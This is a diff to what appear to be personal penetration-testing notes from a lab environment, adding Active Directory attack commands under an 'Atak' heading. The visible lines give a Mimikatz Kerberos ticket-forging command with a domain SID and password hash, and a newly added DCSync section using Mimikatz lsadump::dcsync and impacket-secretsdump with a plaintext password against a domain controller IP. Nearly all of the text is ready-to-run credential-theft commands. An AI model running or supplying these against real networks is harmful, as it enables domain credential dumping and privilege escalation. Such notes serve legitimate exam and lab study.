@@ -476,3 +476,9 @@ Atak:
         2. whoami /user ( except last 4 digits, we just need domain SID )
         3. target SPN: server name + domain name: web04.corp.com
         kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+    DCSYNC:
+        Win:
+            mimi:
+            lsadump::dcsync /user:corp\dave
+        Lin:
+            impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
